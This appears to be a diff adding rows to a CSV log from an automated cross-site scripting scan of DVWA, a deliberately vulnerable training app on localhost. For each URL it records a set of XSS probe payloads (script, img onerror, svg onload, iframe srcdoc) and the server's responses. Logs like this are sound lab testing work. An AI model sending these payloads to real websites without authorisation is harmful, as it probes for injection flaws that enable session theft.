+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/login_logo.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,8641,8641
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/RandomStorm.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4281,4281
+http://127.0.0.1/dvwa/images/logo.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/logo.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/logo.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/logo.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/logo.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/logo.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/logo.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/logo.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4811,4811
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/spanner.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,446,446
+http://127.0.0.1/dvwa/images/warning.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/warning.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/warning.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/warning.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/warning.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/warning.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/warning.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/warning.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,401,401
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,<script>alert('XSS')</script>,200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,<body onload=alert('XSS')>,200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/dollar.png,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,287,287
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/images/?C=N;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,2167,2167
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/login.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/login.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/login.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/login.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/login.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/login.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/login.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/login.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,842,842
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/main.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/main.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/main.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/main.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/main.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/main.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/main.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/main.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,4026,4026
+http://127.0.0.1/dvwa/css/source.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/source.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/source.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/source.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/source.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/source.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/source.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/source.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,240,240
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1529,1529
+http://127.0.0.1/dvwa/css/help.css,id,GET,<script>alert('XSS')</script>,200,False,False,,,304,304
+http://127.0.0.1/dvwa/css/help.css,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,304,304
+http://127.0.0.1/dvwa/css/help.css,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,304,304
+http://127.0.0.1/dvwa/css/help.css,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,304,304
+http://127.0.0.1/dvwa/css/help.css,id,GET,<body onload=alert('XSS')>,200,False,False,,,304,304
+http://127.0.0.1/dvwa/css/help.css,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,304,304
+http://127.0.0.1/dvwa/css/help.css,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,304,304
+http://127.0.0.1/dvwa/css/help.css,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,304,304
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=M;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<script>alert('XSS')</script>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,"""><script>console.log('XSS')</script>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,<body onload=alert('XSS')>,200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,"<iframe srcdoc=""<script>console.log('XSS')</script>""></iframe>",200,False,False,,,1500,1500
+http://127.0.0.1/dvwa/?C=D;O=D,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1500,1500
